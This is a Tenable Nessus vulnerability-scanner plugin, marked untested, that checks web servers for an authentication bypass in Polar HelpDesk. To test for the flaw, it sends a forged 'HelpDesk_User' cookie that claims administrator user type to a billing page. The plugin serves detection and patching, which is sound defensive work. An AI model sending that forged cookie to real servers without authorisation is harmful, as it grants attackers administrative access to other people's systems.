#
# (C) Tenable Network Security
#
# *UNTESTED*

if(description)
{
 script_id(14193);
 script_bugtraq_id(10775);
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "Polar HelpDesk Authentication ByPass";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote server is running Polars HelpDesk. 

There is a flaw in the remote version of this software which may allow
an attacker to bypass the authentication mechanism of this software and
gain administrative access.

Solution : Upgrade to the latest version of this software
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for PolarHelpDesk";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


foreach d (cgi_dirs())
{
 req = http_get(item:d+"/billing/billingmanager_income.asp", port:port);
 idx = stridx(req, string("\r\n\r\n"));
 req = insstr(req, string("\r\nCookie: HelpDesk_User=UserType=6&UserID=1;\r\n\r\n"), idx);
 res = http_keepalive_send_recv(port:port, data:req);
  
 if ( res == NULL ) exit(0);
 if( "ticketinfo.asp" >< res &&
   egrep(pattern:"\.\./ticketsupport/ticketinfo\.asp\?ID=[0-9]*", string:res) )
 {
	security_hole(port);
	exit(0);
 }
}
